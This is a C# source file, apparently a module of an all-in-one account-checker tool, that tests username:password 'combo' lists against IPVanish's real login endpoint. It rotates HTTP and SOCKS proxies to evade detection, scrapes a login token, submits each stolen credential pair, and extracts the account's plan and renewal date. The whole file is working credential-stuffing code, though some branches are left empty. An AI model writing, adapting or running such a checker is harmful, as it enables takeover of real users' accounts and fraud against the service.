using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class IpVanishmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text5 = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var cookieStorage_ = new CookieStorage();
                            var text = smethod_24(ref cookieStorage_);
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.Cookies = cookieStorage_;
                            var text2 = req.Post(new Uri("https://account.ipvanish.com/login/validate"),
                                    new BytesContent(Encoding.Default.GetBytes("clientToken=" + text + "&username=" +
                                                                               array[0] + "&password=" + array[1])))
                                .ToString();
                            if (!text2.Contains("Account Status"))
                                if (text2.Contains("Sorry, your account credentials are invalid."))
                                {
                                }

                            var value = Regex.Match(text2, "Current Plan:.*?\n.*?profile_label\">(.*?)<").Groups[1]
                                .Value;
                            var value2 = Regex.Match(text2, "Renewal Date:.*?\n.*?profile_label\">(.*?)<").Groups[1]
                                .Value;
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text5);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }

        private static string smethod_24(ref CookieStorage cookieStorage_0)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        cookieStorage_0 = new CookieStorage();
                        req.Cookies = cookieStorage_0;
                        var text = req.Get(new Uri("https://account.ipvanish.com/login")).ToString();
                        if (!text.Contains("\"clientToken\"")) continue;
                        return Regex.Match(text, "id=\"clientToken\" value=\"(.*?)\"").Groups[1].Value;
                    }
                }
                catch
                {
                    Program.Errors++;
                }
        }
    }
}